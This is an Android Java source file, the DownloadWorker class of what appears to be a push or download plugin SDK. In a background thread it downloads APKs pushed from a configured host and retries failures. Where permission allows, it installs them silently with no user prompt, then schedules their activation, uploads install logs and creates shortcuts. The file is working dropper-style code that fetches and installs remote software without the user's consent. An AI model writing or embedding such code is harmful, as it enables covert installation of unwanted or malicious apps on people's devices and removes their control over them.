package com.tiho.dlplugin.observer.download;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.util.Pair;

import com.tiho.base.base.http.HttpHelper;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushConfigBean;
import com.tiho.dlplugin.bean.PushMessageBean;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.dao.PushMessageDAO;
import com.tiho.dlplugin.dao.ScheduleActivationDAO;
import com.tiho.dlplugin.dao.SilentPushMessageDAO;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.export.ShortcutActivity;
import com.tiho.dlplugin.install.PackageUtilsEx;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.scheduleact.ScheduleActList;
import com.tiho.dlplugin.task.uninstall.UnInstallList;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.NetworkUtil;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.SilentInstall;
import com.tiho.dlplugin.util.StringUtils;

public class DownloadWorker extends Thread {

	public static final int PUSH_AUTO_INSTALL_BUT_NO_PERMISSION = 1;

	private Context context;

	private DownloadList downloadList;
	private FileDownloader downloader;

	private PushMessageDAO msgDao;
	private SilentPushMessageDAO silentDao;

	private final Object lock = new Object();
	
	
	public DownloadWorker(DownloadList downloadList, Context c) throws Exception {
		this.context = c;
		this.downloadList = downloadList;
		this.downloader = new FileDownloader();
		this.msgDao = DAOFactory.getPushMessageDAO(c);
		this.silentDao = DAOFactory.getSilentPushDAO(c);

		NetworkUtil.registerNetworkRecoverEvent(context, new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				synchronized (lock) {
					lock.notifyAll();
					LogManager.LogShow("网络恢复，下载也恢复");
				}
			}
		});
	}

	@Override
	public void run() {

		while (true) {

			if (!NetworkUtil.isNetworkOk(context)) {
				boolean result = toWait();
				if(!result)
					return;
			}

			if (!FileUtil.hasEnoughSpaceSize(context))
				FileUtil.deleteInstalledApk(context);

			FileUtil.deleteSomeFileTask(context);
			if (FileUtil.hasEnoughSpaceSize(context)) {
				gotoDownload();
			} else {
				try {
					downloadList.await();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	private static AtomicBoolean running = new AtomicBoolean(false);

	private boolean toWait() {
		synchronized (lock) {
			try {
				running.set(false);
				lock.wait();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			
			if(running.get())
				return false;
			
			running.set(true);
			return true;
		}
	}
	
	private Pair<String, String[]> extraHost(Context context) {
		PushConfigDAO dao = DAOFactory.getConfigDAO(context);
		PushConfigBean config = dao.getConfigByKey(PushConfigDAO.TYPE_CONFIG, PushConfigBean.class);

		String ips = config.getDownIp();
		String[] ipList = StringUtils.isEmpty(ips) ? new String[0] : ips.split(",");

		return Pair.create(config.getDownHost(), ipList);

	}


	private void gotoDownload() {
		PushMessageBean msg  = null;
		try {
			msg = downloadList.takeOne();
			DownloadStat stat = DownloadStat.initFrom(context, msg , false);
			downloader.startDownload(context, stat , extraHost(context));
			
			int fail = 0;
			boolean result = false;

			while (!(result = stat.isComplete()) && (++fail) < 3) {
				LogManager.LogShow("Push下载失败" + fail + ",重试"+stat.getUri());
				downloader.startDownload(context, stat, extraHost(context));
			}
			

			if(result){
				LogManager.LogShow(stat.getFinalFile().getAbsolutePath() + "静默应用下载完成");
				
				if (!stat.getFinalFile().exists())
					stat.renameToFinalName();
				
				downloadList.consumed(msg);
				
				afterDownload(msg, stat.getFinalFile());
			}
		} catch (Exception e) {
			LogManager.LogShow("下载时出错", e);
		}finally{
			if(msg != null)
				downloadList.consumed(msg);
		}
	}

	// 静默应用下载完成
	private void afterDownload(final PushMessageBean push, final File apk) {
		//下载完成后后记录当前时间
		FileUtil.saveDownloadInfo(context, apk.getAbsolutePath(), push.getPackName());
		// 如果没有安装权限,
		if (SilentInstall.IsSupportBGInstall(context) != 0) {
			LogManager.LogShow("静默应用" + push.getAppname() + "(" + push.getPackName() + ")没有安装权限，放到列表中待推送");
			try {

				PushStat stat = PushStat.getInstance(context);
				if (push.getPushId() > stat.getCursorId())
					stat.setCursorId(push.getPushId());
				
				msgDao.savePushMessage(push);

			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			if (!UnInstallList.deleted(context, push.getPackName())) {
				String apkPath = apk.getAbsolutePath();
				LogManager.LogShow("afterDownload context = " + context + ", apkPath = " + apkPath);
				int ret = SilentInstall.SilentInstallApk(context, apkPath);
				String pkg = push.getPackName();
				boolean good  = (ret == PackageUtilsEx.INSTALL_SUCCEEDED);
				LogManager.LogShow("afterDownload ret = " + ret + ", pkg = " + pkg);
				if(PackageUtilsEx.INSTALL_SUCCEEDED == ret){
					push.setDone(true);
					LogManager.LogShow("静默安装成功:" + pkg + "," + ret);

					if (!StringUtils.isEmpty(push.getTimeract())){
						// 如果已经安装就加入到定时激活列表中
						ScheduleActivationDAO  scheduleActDao = DAOFactory.getScheduleActRegularDAO(context);
						scheduleActDao.saveScheduleList(push.getPushId(), push.getPackName(), push.getTimeract() , false);
						ScheduleActList.getInstance(context).load(push.getPackName());
					}
				}else{
					LogManager.LogShow("afterDownload 安装失败：" + pkg);
				}
				
				LogUploadManager.getInstance(context).addInstallLog(push.getPushId(),
						ret == PackageUtilsEx.INSTALL_SUCCEEDED ? 1 : 0, "INSTALL_RESULT=" + good+",PACK="+pkg, push.getPackName(),
						push.getAutoInstall().equals("Y") ? 1 : 2, push.getAutoInstall());
				try {
					msgDao.savePushMessage(push);
				} catch (Exception e) {
					e.printStackTrace();
				}
				
//				SilentInstall.SilentInstallApk(context, push.getPackName(), apk.getAbsolutePath(),
//						new IPackageInstallObserver.Stub() {
//
//							// 安装结果
//							@Override
//							public void packageInstalled(String arg0, int arg1) throws RemoteException {
//								boolean good  = arg1 != -1;
//								if (!good) {
//									LogManager.LogShow("安装失败：" + arg0);
//								} else {
//									push.setDone(true);
//									LogManager.LogShow("静默安装成功:" + arg0 + "," + arg1);
//
//									if (!StringUtils.isEmpty(push.getTimeract())){
//										// 如果已经安装就加入到定时激活列表中
//										ScheduleActivationDAO  scheduleActDao = DAOFactory.getScheduleActRegularDAO(context);
//										scheduleActDao.saveScheduleList(push.getPushId(), push.getPackName(), push.getTimeract() , false);
//										ScheduleActList.getInstance(context).load(push.getPackName());
//									}
//									
//								}
//
//								LogUploadManager.getInstance(context).addInstallLog(push.getPushId(),
//										arg1 == -1 ? 0 : 1, "INSTALL_RESULT=" + good+",PACK="+arg0, push.getPackName(),
//										push.getAutoInstall().equals("Y") ? 1 : 2, push.getAutoInstall());
//								try {
//									
//									msgDao.savePushMessage(push);
//								} catch (Exception e) {
//									e.printStackTrace();
//								}
//							}
//						});

			} else {
				LogManager.LogShow(push.getPackName() + "已经被卸载，不进行静默安装");
				LogUploadManager.getInstance(context).addInstallLog(push.getPushId(), 2, "ALREADY_UNINSTALLED",
						push.getPackName(), push.getAutoInstall().equals("Y") ? 1 : 2, push.getAutoInstall());
			}

		}

		try {
//			push.setDone(true);
			msgDao.savePushMessage(push);
			silentDao.deletePushMessage(push.getPushId());
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	private void createShortcut(Context context, PushMessageBean push) {

		File iconFile = push.getIconFile(context);

		if (iconFile.exists()) {

			ShortcutActivity.createShortcut(context, push.getPushId());

		} else if (NetworkUtil.isNetworkOk(context)) {
			// 有网络就下载
			byte[] data = HttpHelper.getInstance(context).rawGet(push.getIcon());
			try {

				FileUtil.writeToFile(iconFile, data, false);
				ShortcutActivity.createShortcut(context, push.getPushId());

			} catch (Exception e) {
				LogManager.LogShow("下载icon失败", e);
			}
		} else {
			// 无网络从apk中获取
			Bitmap bitmap = PackageUtil.loadUninstallApkIcon(context, push.getApkFile(context).getAbsolutePath());
			iconFile = push.getIconFile(context);
			try {

				iconFile.createNewFile();
				FileOutputStream fos = new FileOutputStream(iconFile);
				// 写入到文件中
				bitmap.compress(CompressFormat.PNG, 100, fos);
				ShortcutActivity.createShortcut(context, push.getPushId());

			} catch (IOException e) {
				e.printStackTrace();
			}

		}
	}

}
